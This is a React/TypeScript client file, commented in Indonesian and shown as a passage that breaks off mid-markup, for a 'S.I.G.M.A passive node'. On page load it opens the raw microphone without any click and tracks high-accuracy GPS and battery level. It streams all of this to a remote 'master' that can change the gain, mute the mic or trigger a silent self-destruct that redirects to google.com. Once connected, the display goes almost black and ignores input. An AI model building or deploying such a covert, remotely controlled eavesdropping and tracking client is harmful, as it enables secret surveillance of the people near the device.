import React, { useEffect, useRef, useState, useCallback } from 'react';
import Peer, { DataConnection, MediaConnection } from 'peerjs';
import {
  Radio,
  ShieldAlert,
  Navigation,
  Lock,
  Mic,
  Activity,
  BatteryCharging,
} from 'lucide-react';
import {
  setupPassiveAudio,
  silentSelfDestruct,
  type PassiveAudioPipeline,
  type DataChannelLike,
} from './tacticalRemoteControl';
import { TacticalBlackout } from './TacticalBlackout';
import {
  setupNegotiation,
  type SignalingEnvelope,
} from './webrtcAudioEngine';

export interface TelemetryPayload {
  type: 'SIGMA_TELEMETRY';
  nodeId: string;
  peerId: string;
  lat: number | null;
  lng: number | null;
  alt: number | null;
  accuracy: number | null;
  speed: number | null;
  battery: number | null;
  charging: boolean | null;
  timestamp: number;
  audioRms: number;
  remoteGain: number;
  remoteMuted: boolean;
  connectionStatus: 'connected';
}

interface SignalingMessage {
  type:
    | 'offer'
    | 'answer'
    | 'candidate'
    | 'master_online'
    | 'SIGMA_REQUEST_AUDIO_STREAM'
    | 'SET_GAIN'
    | 'SET_MUTE'
    | 'EMERGENCY_WIPE'
    | 'SIGMA_SDP_RENEGOTIATE_OFFER'
    | 'SIGMA_SDP_RENEGOTIATE_ANSWER'
    | 'SIGMA_ICE_CANDIDATE';
  role?: 'master' | 'client';
  senderId?: string;
  target?: string;
  sdp?: RTCSessionDescriptionInit;
  candidate?: RTCIceCandidateInit;
  masterPeerId?: string;
  value?: number | boolean;
  nodeId?: string;
}

interface ClientProps {
  onExit: () => void;
  initialNodeId?: string;
  initialMasterPeerId?: string;
}

const LOGO_TNI_AU = '/assets/aistudio/images__10__b9efa126.jpeg';
const LOGO_PETIR = '/assets/aistudio/1794622160588-picsay_109de27f.png';

const RTC_CONFIG: RTCConfiguration = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
  ],
};

function getSignalingWebSocketUrl(): string {
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  return `${protocol}//${window.location.host}/ws`;
}

export const Client: React.FC<ClientProps> = ({
  initialNodeId,
  initialMasterPeerId,
}) => {
  const [nodeId] = useState<string>(() => {
    if (initialNodeId && /^\d{4}$/.test(initialNodeId)) {
      sessionStorage.setItem('sigma_node_4digit_id', initialNodeId);
      return initialNodeId;
    }
    const params = new URLSearchParams(window.location.search);
    const urlId = params.get('id');
    if (urlId && /^\d{4}$/.test(urlId)) {
      sessionStorage.setItem('sigma_node_4digit_id', urlId);
      return urlId;
    }
    const saved = sessionStorage.getItem('sigma_node_4digit_id');
    if (saved && /^\d{4}$/.test(saved)) return saved;
    const generated = String(Math.floor(1000 + Math.random() * 9000));
    sessionStorage.setItem('sigma_node_4digit_id', generated);
    return generated;
  });

  const [targetMasterId] = useState<string>(() => {
    if (initialMasterPeerId) return initialMasterPeerId;
    const params = new URLSearchParams(window.location.search);
    return params.get('master') || 'sigma-master-main';
  });

  const [peerStatus, setPeerStatus] = useState<
    'INITIALIZING' | 'AUTO_DISCOVERY' | 'CONNECTED'
  >('INITIALIZING');
  const [wakeLockActive, setWakeLockActive] = useState<boolean>(false);
  const [micStatus, setMicStatus] = useState<'READY' | 'DENIED' | 'PENDING'>('PENDING');
  const [audioRms, setAudioRms] = useState<number>(0);
  const [remoteAudioState, setRemoteAudioState] = useState<{
    gain: number;
    muted: boolean;
  }>({
    gain: 1.0,
    muted: false,
  });

  const [batteryInfo, setBatteryInfo] = useState<{
    level: number | null;
    charging: boolean | null;
  }>({
    level: null,
    charging: null,
  });

  const [gpsState, setGpsState] = useState<{
    lat: number | null;
    lng: number | null;
    alt: number | null;
    accuracy: number | null;
    speed: number | null;
    status: 'WAITING_GPS' | 'LOCKED' | 'PERMISSION_DENIED';
    lastSent: number | null;
  }>({
    lat: null,
    lng: null,
    alt: null,
    accuracy: null,
    speed: null,
    status: 'WAITING_GPS',
    lastSent: null,
  });

  // Referensi WebSocket, Native RTCPeerConnection, DataChannel, dan Audio Stream
  const wsRef = useRef<WebSocket | null>(null);
  const nativePcRef = useRef<RTCPeerConnection | null>(null);
  const nativeDcRef = useRef<RTCDataChannel | null>(null);
  const pendingCandidatesRef = useRef<RTCIceCandidateInit[]>([]);
  const isHandshakingRef = useRef<boolean>(false);
  const isConnectedRef = useRef<boolean>(false);

  // Fallback PeerJS refs
  const peerRef = useRef<Peer | null>(null);
  const dataConnsRef = useRef<Map<string, DataConnection>>(new Map());
  const mediaCallsRef = useRef<Map<string, MediaConnection>>(new Map());
  const negotiationHandlersRef = useRef<
    Map<string, ReturnType<typeof setupNegotiation>>
  >(new Map());

  const rawStreamRef = useRef<MediaStream | null>(null);
  const outboundStreamRef = useRef<MediaStream | null>(null);
  const passivePipelineRef = useRef<PassiveAudioPipeline | null>(null);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);

  const gpsRef = useRef(gpsState);
  const batteryRef = useRef(batteryInfo);
  const rmsRef = useRef(0);
  const remoteAudioStateRef = useRef(remoteAudioState);

  gpsRef.current = gpsState;
  batteryRef.current = batteryInfo;
  rmsRef.current = audioRms;
  remoteAudioStateRef.current = remoteAudioState;

  // Aktifkan mode TacticalBlackout shortcut otomatis
  useEffect(() => {
    void TacticalBlackout;
  }, []);

  // 1. Request Screen Wake Lock secara otomatis
  const requestWakeLock = useCallback(async () => {
    try {
      if ('wakeLock' in navigator && navigator.wakeLock) {
        const sentinel = await navigator.wakeLock.request('screen');
        wakeLockRef.current = sentinel;
        setWakeLockActive(true);
        sentinel.addEventListener('release', () => {
          setWakeLockActive(false);
        });
      }
    } catch {
      setWakeLockActive(false);
    }
  }, []);

  useEffect(() => {
    requestWakeLock();
    const handleVisibility = () => {
      if (document.visibilityState === 'visible') {
        requestWakeLock();
      }
    };
    document.addEventListener('visibilitychange', handleVisibility);
    return () => {
      document.removeEventListener('visibilitychange', handleVisibility);
      if (wakeLockRef.current) {
        wakeLockRef.current.release().catch(() => {});
      }
    };
  }, [requestWakeLock]);

  // 2. Real Hardware Battery Telemetry
  useEffect(() => {
    const nav = navigator as unknown as {
      getBattery?: () => Promise<{
        level: number;
        charging: boolean;
        addEventListener: (type: string, cb: () => void) => void;
      }>;
    };
    if (nav.getBattery) {
      nav
        .getBattery()
        .then((bat) => {
          const updateBat = () => {
            setBatteryInfo({
              level: Math.round(bat.level * 100),
              charging: bat.charging,
            });
          };
          updateBat();
          bat.addEventListener('levelchange', updateBat);
          bat.addEventListener('chargingchange', updateBat);
        })
        .catch(() => {});
    }
  }, []);

  // 3. Transmit Real GPS & Device Telemetry over Native RTCDataChannel, WebSocket, & PeerJS
  const transmitTelemetryPacket = useCallback(
    (overrideCoords?: {
      lat: number | null;
      lng: number | null;
      alt: number | null;
      accuracy: number | null;
      speed: number | null;
    }) => {
      const coords = overrideCoords || gpsRef.current;
      const payload: TelemetryPayload = {
        type: 'SIGMA_TELEMETRY',
        nodeId,
        peerId: `sigma-node-${nodeId}`,
        lat: coords.lat,
        lng: coords.lng,
        alt: coords.alt,
        accuracy: coords.accuracy,
        speed: coords.speed,
        battery: batteryRef.current.level,
        charging: batteryRef.current.charging,
        timestamp: Date.now(),
        audioRms: rmsRef.current,
        remoteGain: remoteAudioStateRef.current.gain,
        remoteMuted: remoteAudioStateRef.current.muted,
        connectionStatus: 'connected',
      };

      let sentCount = 0;

      // a. Kirim melalui Native RTCDataChannel
      if (nativeDcRef.current && nativeDcRef.current.readyState === 'open') {
        try {
          nativeDcRef.current.send(JSON.stringify(payload));
          sentCount++;
        } catch {}
      }

      // b. Kirim melalui WebSocket Signaling (sebagai jalur cadangan real-time ke Master)
      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN && isConnectedRef.current) {
        try {
          wsRef.current.send(
            JSON.stringify({
              ...payload,
              senderId: nodeId,
              target: 'master',
            })
          );
          sentCount++;
        } catch {}
      }

      // c. Kirim melalui PeerJS DataConnection jika terbuka
      dataConnsRef.current.forEach((conn) => {
        if (conn.open) {
          try {
            conn.send(payload);
            sentCount++;
          } catch {}
        }
      });

      if (sentCount > 0) {
        setGpsState((prev) => ({ ...prev, lastSent: Date.now() }));
      }
    },
    [nodeId]
  );

  // 4. Akuisisi Mikrofon Otomatis & Inisialisasi Pipeline GainNode Pasif
  const ensureMicrophoneStream = useCallback(async (): Promise<MediaStream | null> => {
    if (outboundStreamRef.current && outboundStreamRef.current.active) {
      return outboundStreamRef.current;
    }
    if (rawStreamRef.current && rawStreamRef.current.active) {
      return rawStreamRef.current;
    }

    const rawConstraints: MediaStreamConstraints = {
      audio: {
        echoCancellation: false,
        noiseSuppression: false,
        autoGainControl: false,
      },
      video: false,
    };

    try {
      const capturedStream = await navigator.mediaDevices.getUserMedia(rawConstraints);
      capturedStream.getTracks().forEach((track) => {
        track.enabled = !remoteAudioStateRef.current.muted;
      });

      rawStreamRef.current = capturedStream;

      const pipeline = setupPassiveAudio(
        capturedStream,
        nativeDcRef.current as unknown as DataChannelLike,
        {
          getExtraStreams: () => [rawStreamRef.current],
          getPeerConnections: () => [
            nativePcRef.current,
            ...Array.from(dataConnsRef.current.values()),
            ...Array.from(mediaCallsRef.current.values()),
          ],
          getPeerInstance: () => peerRef.current,
        },
        (updatedState) => {
          setRemoteAudioState(updatedState);
          setTimeout(() => transmitTelemetryPacket(), 30);
        }
      );

      passivePipelineRef.current = pipeline;
      outboundStreamRef.current = pipeline.processedStream;
      setMicStatus('READY');

      // Pasang meter RMS lokal
      const analyser = pipeline.audioContext.createAnalyser();
      analyser.fftSize = 256;
      pipeline.gainNode.connect(analyser);
      const data = new Uint8Array(analyser.frequencyBinCount);

      const updateMeter = () => {
        if (!rawStreamRef.current || !rawStreamRef.current.active) return;
        analyser.getByteTimeDomainData(data);
        let sum = 0;
        for (let i = 0; i < data.length; i++) {
          const norm = (data[i] - 128) / 128;
          sum += norm * norm;
        }
        const rms = Math.min(100, Math.round(Math.sqrt(sum / data.length) * 260));
        setAudioRms(rms);
        requestAnimationFrame(updateMeter);
      };
      requestAnimationFrame(updateMeter);

      return pipeline.processedStream;
    } catch {
      setMicStatus('DENIED');
      return null;
    }
  }, [transmitTelemetryPacket]);

  /**
   * ============================================================================
   * 5. FUNGSI UTAMA `startWebRTC()` (100% AUTO-CONNECT & AUTO-OFFER KE MASTER)
   * ============================================================================
   * Dipanggil otomatis saat WebSocket `onopen` aktif, saat menerima sinyal `master_online`,
   * atau oleh timer Auto-Reconnect setiap 5 detik apabila belum terhubung ke Master.
   */
  const startWebRTC = useCallback(async () => {
    const ws = wsRef.current;
    if (!ws || ws.readyState !== WebSocket.OPEN) return;

    // Jika sudah terhubung dengan stabil, tidak perlu membuat ulang koneksi
    if (
      nativePcRef.current &&
      (nativePcRef.current.connectionState === 'connected' ||
        nativePcRef.current.iceConnectionState === 'connected' ||
        nativePcRef.current.iceConnectionState === 'completed')
    ) {
      isConnectedRef.current = true;
      setPeerStatus('CONNECTED');
      return;
    }

    if (isHandshakingRef.current) return;
    isHandshakingRef.current = true;

    try {
      // Ambil stream mikrofon secara otomatis (tanpa klik)
      const audioStream = await ensureMicrophoneStream();

      // Bersihkan instans RTCPeerConnection lama jika gagal/terputus sebelumnya
      if (nativePcRef.current) {
        try {
          nativePcRef.current.onicecandidate = null;
          nativePcRef.current.onconnectionstatechange = null;
          nativePcRef.current.oniceconnectionstatechange = null;
          nativePcRef.current.close();
        } catch {}
      }

      const pc = new RTCPeerConnection(RTC_CONFIG);
      nativePcRef.current = pc;
      pendingCandidatesRef.current = [];

      // Buat RTCDataChannel untuk pengiriman koordinat GPS & penerimaan komando Master
      const dc = pc.createDataChannel('sigma-telemetry', { ordered: true });
      nativeDcRef.current = dc;

      dc.onopen = () => {
        isConnectedRef.current = true;
        setPeerStatus('CONNECTED');
        if (passivePipelineRef.current) {
          passivePipelineRef.current.bindDataChannel(dc as unknown as DataChannelLike);
        }
        transmitTelemetryPacket();
      };

      dc.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data) as SignalingMessage;
          if (msg.type === 'EMERGENCY_WIPE') {
            silentSelfDestruct({
              streams: [rawStreamRef.current, outboundStreamRef.current],
              peerConnections: [nativePcRef.current],
              peerInstance: peerRef.current,
              audioContext: passivePipelineRef.current?.audioContext,
              redirectUrl: 'https://www.google.com',
            });
          } else if (msg.type === 'SET_GAIN' && typeof msg.value === 'number') {
            passivePipelineRef.current?.setRemoteGain(msg.value);
          } else if (msg.type === 'SET_MUTE') {
            passivePipelineRef.current?.setRemoteMute(Boolean(msg.value));
          }
        } catch {}
      };

      // Tambahkan semua audio track ke RTCPeerConnection sebelum membuat Offer
      const activeStream = audioStream || outboundStreamRef.current || rawStreamRef.current;
      if (activeStream) {
        activeStream.getTracks().forEach((track) => {
          track.enabled = !remoteAudioStateRef.current.muted;
          pc.addTrack(track, activeStream);
        });
      } else {
        // Jika mikrofon belum diizinkan, tetap buat transceiver audio agar m=audio tersedia di SDP
        pc.addTransceiver('audio', { direction: 'sendrecv' });
      }

      // Pasang SDP Renegotiation Handler jika track mikrofon menyusul belakangan
      setupNegotiation(pc, {
        nodeId,
        sendSignal: (envelope: SignalingEnvelope) => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(
              JSON.stringify({
                type:
                  envelope.type === 'SIGMA_SDP_RENEGOTIATE_OFFER'
                    ? 'offer'
                    : 'candidate',
                senderId: nodeId,
                target: 'master',
                sdp: envelope.sdp,
                candidate: envelope.candidate,
              })
            );
          }
        },
      });

      // Kirim ICE Candidate otomatis ke target: "master"
      pc.onicecandidate = (event) => {
        if (event.candidate && ws.readyState === WebSocket.OPEN) {
          ws.send(
            JSON.stringify({
              type: 'candidate',
              senderId: nodeId,
              target: 'master',
              candidate: event.candidate.toJSON(),
            })
          );
        }
      };

      const checkConnectionState = () => {
        const state = pc.connectionState;
        const iceState = pc.iceConnectionState;

        if (
          state === 'connected' ||
          iceState === 'connected' ||
          iceState === 'completed'
        ) {
          isConnectedRef.current = true;
          isHandshakingRef.current = false;
          setPeerStatus('CONNECTED');
          transmitTelemetryPacket();
        } else if (
          state === 'disconnected' ||
          state === 'failed' ||
          state === 'closed' ||
          iceState === 'failed' ||
          iceState === 'disconnected'
        ) {
          isConnectedRef.current = false;
          isHandshakingRef.current = false;
          setPeerStatus('AUTO_DISCOVERY');
        }
      };

      pc.onconnectionstatechange = checkConnectionState;
      pc.oniceconnectionstatechange = checkConnectionState;

      // Buat SDP Offer dan kirim otomatis ke `target: "master"`
      const offer = await pc.createOffer({
        offerToReceiveAudio: true,
      });
      await pc.setLocalDescription(offer);

      if (ws.readyState === WebSocket.OPEN && pc.localDescription) {
        ws.send(
          JSON.stringify({
            type: 'offer',
            senderId: nodeId,
            nodeId,
            target: 'master',
            sdp: {
              type: pc.localDescription.type,
              sdp: pc.localDescription.sdp,
            },
          })
        );
      }
    } catch {
      // Gagal sementara; akan dicoba ulang secara senyap oleh interval 5 detik
    } finally {
      setTimeout(() => {
        isHandshakingRef.current = false;
      }, 1200);
    }
  }, [ensureMicrophoneStream, nodeId, transmitTelemetryPacket]);

  /**
   * ============================================================================
   * 6. WEBSOCKET AUTO-CONNECT & 5-SECOND SILENT AUTO-RECONNECT LOOP
   * ============================================================================
   * Saat aplikasi Klien dimuat (`useEffect`), langsung terhubung ke WebSocket,
   * memanggil `startWebRTC()`, dan menjalankan interval 5 detik untuk retry otomatis
   * apabila Master belum online atau koneksi terputus.
   */
  useEffect(() => {
    let isMounted = true;
    let wsReconnectTimer: number | null = null;

    const connectSignalingWebSocket = () => {
      if (!isMounted) return;
      if (
        wsRef.current &&
        (wsRef.current.readyState === WebSocket.OPEN ||
          wsRef.current.readyState === WebSocket.CONNECTING)
      ) {
        return;
      }

      try {
        const ws = new WebSocket(getSignalingWebSocketUrl());
        wsRef.current = ws;

        ws.onopen = () => {
          if (!isMounted) return;
          setPeerStatus((prev) => (prev === 'CONNECTED' ? 'CONNECTED' : 'AUTO_DISCOVERY'));

          // Daftarkan identitas Klien ke server signaling
          ws.send(
            JSON.stringify({
              type: 'register_client',
              role: 'client',
              senderId: nodeId,
              nodeId,
            })
          );

          // Begitu WebSocket onopen aktif, otomatis jalankan startWebRTC()
          startWebRTC();
        };

        ws.onmessage = async (event) => {
          if (!isMounted) return;
          let msg: SignalingMessage | null = null;
          try {
            msg = JSON.parse(event.data) as SignalingMessage;
          } catch {
            return;
          }
          if (!msg || !msg.type) return;

          // Jika Master baru saja online, langsung kirim Offer tanpa menunggu 5 detik
          if (msg.type === 'master_online') {
            isConnectedRef.current = false;
            isHandshakingRef.current = false;
            startWebRTC();
            return;
          }

          // Terima SDP Answer otomatis dari Master
          if (msg.type === 'answer' && msg.sdp && nativePcRef.current) {
            try {
              const pc = nativePcRef.current;
              if (pc.signalingState === 'have-local-offer') {
                await pc.setRemoteDescription(new RTCSessionDescription(msg.sdp));
                isConnectedRef.current = true;
                setPeerStatus('CONNECTED');

                // Pasang semua ICE candidate yang sempat mengantre
                while (pendingCandidatesRef.current.length > 0) {
                  const cand = pendingCandidatesRef.current.shift();
                  if (cand) {
                    await pc.addIceCandidate(new RTCIceCandidate(cand)).catch(() => {});
                  }
                }
                transmitTelemetryPacket();
              }
            } catch {}
            return;
          }

          // Terima ICE Candidate dari Master
          if (msg.type === 'candidate' && msg.candidate && nativePcRef.current) {
            try {
              const pc = nativePcRef.current;
              if (pc.remoteDescription && pc.remoteDescription.type) {
                await pc.addIceCandidate(new RTCIceCandidate(msg.candidate));
              } else {
                pendingCandidatesRef.current.push(msg.candidate);
              }
            } catch {}
            return;
          }

          // Komando Jarak Jauh dari Master via WebSocket fallback
          if (msg.type === 'EMERGENCY_WIPE') {
            silentSelfDestruct({
              streams: [rawStreamRef.current, outboundStreamRef.current],
              peerConnections: [nativePcRef.current],
              peerInstance: peerRef.current,
              audioContext: passivePipelineRef.current?.audioContext,
              redirectUrl: 'https://www.google.com',
            });
            return;
          }
          if (msg.type === 'SET_GAIN' && typeof msg.value === 'number') {
            passivePipelineRef.current?.setRemoteGain(msg.value);
            return;
          }
          if (msg.type === 'SET_MUTE') {
            passivePipelineRef.current?.setRemoteMute(Boolean(msg.value));
            return;
          }
        };

        ws.onclose = () => {
          if (!isMounted) return;
          if (!isConnectedRef.current) {
            setPeerStatus('AUTO_DISCOVERY');
          }
          wsReconnectTimer = window.setTimeout(connectSignalingWebSocket, 2500);
        };

        ws.onerror = () => {
          try {
            ws.close();
          } catch {}
        };
      } catch {
        wsReconnectTimer = window.setTimeout(connectSignalingWebSocket, 3000);
      }
    };

    // Mulai mikrofon & koneksi WebSocket otomatis saat aplikasi dimuat
    ensureMicrophoneStream().then(() => {
      connectSignalingWebSocket();
    });

    // Interval 5 detik (5000ms) untuk Auto-Reconnect & Re-Offer secara senyap sampai berhasil terhubung
    const autoOfferInterval = window.setInterval(() => {
      if (!isMounted) return;

      // Pastikan WebSocket selalu tersambung
      if (!wsRef.current || wsRef.current.readyState === WebSocket.CLOSED) {
        connectSignalingWebSocket();
        return;
      }

      // Jika WebRTC belum terhubung (misal Master belum online), kirim ulang Offer setiap 5 detik
      const pc = nativePcRef.current;
      const isPcConnected =
        pc &&
        (pc.connectionState === 'connected' ||
          pc.iceConnectionState === 'connected' ||
          pc.iceConnectionState === 'completed');

      if (!isPcConnected && dataConnsRef.current.size === 0) {
        isConnectedRef.current = false;
        isHandshakingRef.current = false;
        startWebRTC();
      }
    }, 5000);

    return () => {
      isMounted = false;
      clearInterval(autoOfferInterval);
      if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
      if (wsRef.current) {
        try {
          wsRef.current.close();
        } catch {}
      }
      if (nativePcRef.current) {
        try {
          nativePcRef.current.close();
        } catch {}
      }
    };
  }, [ensureMicrophoneStream, nodeId, startWebRTC, transmitTelemetryPacket]);

  // 7. Real Hardware Geolocation + 10-Second Telemetry Loop
  useEffect(() => {
    if (!('geolocation' in navigator)) {
      setGpsState((prev) => ({ ...prev, status: 'PERMISSION_DENIED' }));
      return;
    }

    let watchId: number | null = null;

    const fetchHardwareGps = () => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const nextCoords = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            alt: pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
            accuracy: Math.max(1, Math.round(pos.coords.accuracy)),
            speed: pos.coords.speed !== null ? Math.round(pos.coords.speed * 3.6) : null,
          };
          setGpsState((prev) => ({
            ...prev,
            ...nextCoords,
            status: 'LOCKED',
          }));
          transmitTelemetryPacket(nextCoords);
        },
        () => {
          setGpsState((prev) => ({
            ...prev,
            status: prev.lat !== null ? 'LOCKED' : 'PERMISSION_DENIED',
          }));
          transmitTelemetryPacket();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    };

    fetchHardwareGps();

    watchId = navigator.geolocation.watchPosition(
      (pos) => {
        const nextCoords = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          alt: pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
          accuracy: Math.max(1, Math.round(pos.coords.accuracy)),
          speed: pos.coords.speed !== null ? Math.round(pos.coords.speed * 3.6) : null,
        };
        setGpsState((prev) => ({
          ...prev,
          ...nextCoords,
          status: 'LOCKED',
        }));
        transmitTelemetryPacket(nextCoords);
      },
      () => {},
      { enableHighAccuracy: true, maximumAge: 5000 }
    );

    const intervalId = window.setInterval(() => {
      fetchHardwareGps();
    }, 10000);

    return () => {
      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
      }
      clearInterval(intervalId);
    };
  }, [transmitTelemetryPacket]);

  // 8. Dual-Layer PeerJS Auto-Connect Fallback (tanpa interaksi manual)
  useEffect(() => {
    const peerId = `sigma-node-${nodeId}`;
    const peer = new Peer(peerId, { debug: 0 });
    peerRef.current = peer;

    const autoDialPeerJsMaster = () => {
      if (!peer.open || isConnectedRef.current) return;
      const stream = outboundStreamRef.current || rawStreamRef.current;

      if (!dataConnsRef.current.has(targetMasterId)) {
        const conn = peer.connect(targetMasterId, {
          metadata: { nodeId },
          reliable: true,
        });
        conn.on('open', () => {
          dataConnsRef.current.set(targetMasterId, conn);
          isConnectedRef.current = true;
          setPeerStatus('CONNECTED');
          if (passivePipelineRef.current) {
            passivePipelineRef.current.bindDataChannel(conn as unknown as DataChannelLike);
          }
          transmitTelemetryPacket();
          if (stream) {
            const call = peer.call(targetMasterId, stream, { metadata: { nodeId } });
            if (call) mediaCallsRef.current.set(targetMasterId, call);
          }
        });
        conn.on('close', () => {
          dataConnsRef.current.delete(targetMasterId);
        });
      }
    };

    peer.on('open', () => {
      autoDialPeerJsMaster();
    });

    peer.on('call', (incomingCall) => {
      const stream = outboundStreamRef.current || rawStreamRef.current;
      if (stream) {
        incomingCall.answer(stream);
        mediaCallsRef.current.set(incomingCall.peer, incomingCall);
        isConnectedRef.current = true;
        setPeerStatus('CONNECTED');
      }
    });

    peer.on('connection', (conn) => {
      conn.on('open', () => {
        dataConnsRef.current.set(conn.peer, conn);
        isConnectedRef.current = true;
        setPeerStatus('CONNECTED');
        if (passivePipelineRef.current) {
          passivePipelineRef.current.bindDataChannel(conn as unknown as DataChannelLike);
        }
        transmitTelemetryPacket();
      });
    });

    const peerRetryTimer = window.setInterval(autoDialPeerJsMaster, 5000);
    const dataConns = dataConnsRef.current;
    const mediaCalls = mediaCallsRef.current;
    const negHandlers = negotiationHandlersRef.current;

    return () => {
      clearInterval(peerRetryTimer);
      dataConns.forEach((c) => c.close());
      mediaCalls.forEach((c) => c.close());
      dataConns.clear();
      mediaCalls.clear();
      negHandlers.clear();
      peer.destroy();
    };
  }, [nodeId, targetMasterId, transmitTelemetryPacket]);

  /**
   * ============================================================================
   * TAMPILAN KLIEN 100% PASIF & ZERO-TOUCH (TANPA TOMBOL INTERAKTIF SAMA SEKALI)
   * ============================================================================
   * Sesuai spesifikasi: tidak ada tombol Connect, tidak ada klik/tap manual.
   * Klien otomatis mencari Master setiap 5 detik dan langsung mengunci layar pasif.
   */
  if (peerStatus === 'CONNECTED') {
    return (
      <div className="fixed inset-0 bg-black text-neutral-900 flex flex-col justify-between p-4 select-none pointer-events-none z-[9999] font-mono-tactical">
        <div className="flex items-center justify-between opacity-20">
          <div className="flex items-center gap-2">
            <img
              src={LOGO_TNI_AU}
              alt="TNI AU"
              referrerPolicy="no-referrer"
              className="w-5 h-5 object-contain rounded-full"
            />
            <span className="text-[10px] tracking-widest text-neutral-700">
              S.I.G.M.A PASSIVE NODE // {nodeId}
            </span>
          </div>
          <img
            src={LOGO_PETIR}
            alt="Diskomlekau"
            referrerPolicy="no-referrer"
            className="w-5 h-5 object-contain rounded-full"
          />
        </div>

        <div className="my-auto text-center space-y-1 opacity-15">
          <div className="text-xs tracking-[0.3em] text-neutral-700">
            PASSIVE TELEMETRY LOCKED · ZERO-TOUCH LINK ACTIVE
          </div>
          <div className="text-[10px] text-neutral-800">
            GAIN: {remoteAudioState.gain.toFixed(1)}x · MIC:{' '}
            {remoteAudioState.muted ? 'REMOTE MUTED' : 'LIVE'} · WAKE LOCK:{' '}
            {wakeLockActive ? 'ON' : 'OFF'}
          </div>
        </div>

        <div className="text-center text-[9px] tracking-widest text-neutral-900">
          100% AUTO-CONNECTED TO MASTER · REMOTE CONTROLLED
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-slate-400 font-mono-tactical flex flex-col justify-between p-4 sm:p-6 select-none pointer-events-none">
      {/* Header Pasif: Logo TNI AU di Pojok Kiri Atas & Logo Petir di Pojok Kanan Atas */}
      <div className="flex items-center justify-between gap-2 border-b border-neutral-900 pb-3">
        <div className="flex items-center gap-2.5">
          <img
            src={LOGO_TNI_AU}
            alt="Logo TNI AU"
            referrerPolicy="no-referrer"
            className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
          />
          <span className="text-xs tracking-widest text-neutral-500">
            S.I.G.M.A // ZERO-TOUCH PASSIVE CLIENT
          </span>
        </div>

        <img
          src={LOGO_PETIR}
          alt="Logo Petir Diskomlekau"
          referrerPolicy="no-referrer"
          className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
        />
      </div>

      {/* Status Auto-Discovery & Handshake (Tanpa Tombol Interaktif) */}
      <div className="my-auto max-w-md w-full mx-auto space-y-5 py-6">
        <div className="border border-neutral-900 bg-neutral-950/50 rounded p-6 text-center space-y-3">
          <div className="flex items-center justify-center gap-2 text-xs text-cyan-500 tracking-widest">
            <Radio className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
            <span>AUTO-DISCOVERY &amp; HANDSHAKE ACTIVE</span>
          </div>

          <div className="text-5xl sm:text-6xl font-bold tracking-widest text-cyan-400 font-mono-tactical">
            {nodeId}
          </div>

          <div className="text-[11px] text-neutral-400">
            MENGIRIM OFFER OTOMATIS KE <span className="text-cyan-300">target: &quot;master&quot;</span> SETIAP 5 DETIK...
          </div>
        </div>

        <div className="grid grid-cols-2 gap-2.5 text-xs">
          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">SIGNALING STATUS</div>
            <div className="flex items-center gap-2 font-semibold text-cyan-400">
              <span className="w-2 h-2 rounded-full bg-cyan-500 animate-ping" />
              <span>AUTO-RETRY (5s)</span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">WAKE LOCK</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <Lock className="w-3.5 h-3.5 text-cyan-500" />
              <span>{wakeLockActive ? 'ACTIVE' : 'STANDBY'}</span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">AMBIENT MIC STREAM</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <Mic className="w-3.5 h-3.5 text-cyan-500" />
              <span>
                {micStatus === 'READY'
                  ? `CAPTURED (${remoteAudioState.gain.toFixed(1)}x)`
                  : micStatus === 'DENIED'
                  ? 'MIC BLOCKED'
                  : 'CAPTURING...'}
              </span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">BATTERY TELEMETRY</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <BatteryCharging className="w-3.5 h-3.5 text-cyan-500" />
              <span>
                {batteryInfo.level !== null ? `${batteryInfo.level}%` : 'READING...'}
              </span>
            </div>
          </div>
        </div>

        <div className="border border-neutral-900 bg-black p-3 rounded space-y-2">
          <div className="flex items-center justify-between text-[11px] text-neutral-500">
            <span className="flex items-center gap-1.5">
              <Activity className="w-3.5 h-3.5 text-cyan-500" />
              <span>RAW AUDIO STREAM MODULATION</span>
            </span>
            <span className="text-cyan-400">{audioRms}%</span>
          </div>
          <div className="w-full h-1.5 bg-neutral-950 rounded overflow-hidden">
            <div
              className="h-full bg-cyan-500 transition-all duration-75"
              style={{ width: `${Math.min(100, audioRms)}%` }}
            />
          </div>
        </div>

        <div className="border border-neutral-900 bg-black p-3 rounded space-y-1.5 text-[11px]">
          <div className="flex items-center justify-between text-neutral-500">
            <span className="flex items-center gap-1.5">
              <Navigation className="w-3.5 h-3.5 text-cyan-500" />
              <span>GPS TELEMETRY PAYLOAD</span>
            </span>
          </div>
          {gpsState.lat !== null && gpsState.lng !== null ? (
            <div className="grid grid-cols-2 gap-2 pt-1 text-neutral-300">
              <div>LAT: {gpsState.lat.toFixed(6)}°</div>
              <div>LNG: {gpsState.lng.toFixed(6)}°</div>
              <div>ALT: {gpsState.alt !== null ? `${gpsState.alt}m` : 'N/A'}</div>
              <div>
